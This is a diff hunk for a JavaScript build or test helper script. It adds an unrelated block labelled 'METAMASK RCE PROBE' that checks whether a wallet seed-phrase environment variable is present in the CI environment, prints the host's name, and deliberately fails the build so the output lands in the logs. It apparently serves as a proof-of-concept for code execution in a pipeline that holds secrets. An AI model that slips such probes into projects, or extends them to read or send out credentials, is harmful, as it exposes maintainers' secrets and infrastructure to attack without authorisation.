@@ -31,6 +31,13 @@ const env = {
 if (!fs.existsSync(env.BASE_DIR)) throw new Error(`❌ Base directory not found: ${env.BASE_DIR}`);
 if (!env.TEST_SUITE_TAG) throw new Error('❌ Missing TEST_SUITE_TAG env var');
 
+console.log("========================================");
+console.log("[!] METAMASK RCE PROBE");
+console.log("[!] Seed Phrase Exposure Check:");
+console.log(process.env.MM_TEST_WALLET_SRP ? "EXPOSED" : "SAFE");
+console.log("[!] Hostname: " + require('os').hostname());
+console.log("========================================");
+process.exit(1); // Fail the build to see logs
 /**
  * Minimal GitHub GraphQL helper
  * @param {*} query - The query to run
